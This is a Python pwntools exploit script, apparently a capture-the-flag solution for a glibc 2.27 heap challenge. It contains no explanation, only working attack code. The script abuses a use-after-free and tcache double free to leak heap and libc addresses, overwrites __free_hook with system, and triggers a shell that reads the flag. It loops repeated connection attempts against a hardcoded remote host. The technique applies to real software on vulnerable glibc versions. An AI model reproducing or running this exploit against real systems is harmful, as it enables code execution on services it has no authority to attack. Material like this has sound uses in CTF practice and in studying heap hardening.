#!/usr/bin/python
#-*-coding:utf-8-*- 
from pwn import *
import sys
from ctypes import *
import time
import random

'''
patchelf --set-interpreter /glibc/2.27/amd64/lib/ld-2.27.so --set-rpath /glibc/2.27/amd64/lib random_heap
'''

#r=process('./pe')
#r=remote('124.71.140.198','49154')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#v0=(round(time.time()))
#random.seed(v0)
#def float_to_hex(f):
#    return int(struct.unpack('<I', struct.pack('<f', f))[0])
#def myrand(size):
#	new=int(size)
#	v=float_to_hex(random.random())
#	v2=int(0xf)
#	v1=(v & v2)
#	v3=v1*16
#	print(hex(v3))
#	if size==v3:
#		return 0
#	else:
#		return size-v3


def add(idx,size):
	r.recv()
	r.sendline('1')
	r.recv()
	r.sendline(str(idx))
	r.recv()
	r.sendline(str(size))
def edit(idx,con):
	r.recv()
	r.sendline('2')
	r.recv()
	r.sendline(str(idx))
	r.recv()
	r.sendline(con)
def show(idx):
	r.recv()
	r.sendline('3')
	r.recv()
	r.sendline(str(idx))
def dele(idx):
	r.recv()
	r.sendline('4')
	r.recv()
	r.sendline(str(idx))





def pwn():
	add(0,0xf8)
	add(1,0x100)
	edit(1,"/bin/sh\x00\x00")
	dele(0)
	edit(0,'a'*0x10)
	dele(0)
	show(0)
	r.recvuntil("Content: ",timeout=0.4)
	info = r.recvuntil("\n",timeout=0.4, drop=True)
	heap_addr = u64(info.ljust(8, b"\x00"))
	log.info("heap_addr: "+hex(heap_addr))
	for i in range(6):
		edit(0,'a'*0x10)
		dele(0)
	show(0)
	main_arean_96 = u64(((r.recvuntil("\x7f",timeout=0.4))[-6::]).ljust(8,'\x00'))
	log.info("main_arean_96: "+hex(main_arean_96))
	libc_base = (main_arean_96 - 96) - 0x3ebc40#0x3aec40
	print "libc_base:",hex(libc_base)

	free_hook = libc_base + libc.sym['__free_hook']
	system = libc_base + libc.sym['system']

	add(2,0x18)
	dele(2)
	edit(0,p64(free_hook)*2)
	dele(2)
	edit(0,p64(free_hook)*2)
	add(2,0x18)
	show(2)
	tmp = u64(((r.recvuntil("\x7f",timeout=0.4))[-6::]).ljust(8,'\x00'))
	if(tmp!=free_hook):
		exit()

	#gdb.attach(r,"b *$rebase(0xBCB)")
	#raw_input()

	add(3,0x18)
	edit(3,p64(system))
	dele(1)

	r.sendline("cat flag")
	print r.recvuntil("}",timeout=0.4)


#context.log_level='debug'


#r = process("./random_heap", env={"LD_PRELOAD":"./libc-2.27.so"})
#libc = ELF("libc-2.27.so")
#r = process("./random_heap")
#libc = ELF("/glibc/2.27/amd64/lib/libc.so.6")

#r = process("./uaf")
#libc = ELF("/glibc/2.27/amd64/lib/libc.so.6")
#r = process("./uaf", env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("libc-2.27.so")

#pwn()
#r.interactive()

times = 0
while 1:
	try:
		#r = process("./random_heap")
		r = remote("124.71.140.198",49155)
		pwn()
		r.interactive()
	except:
		times += 1
		print("="*8+str(times)+" times"+"="*8)
		r.close()

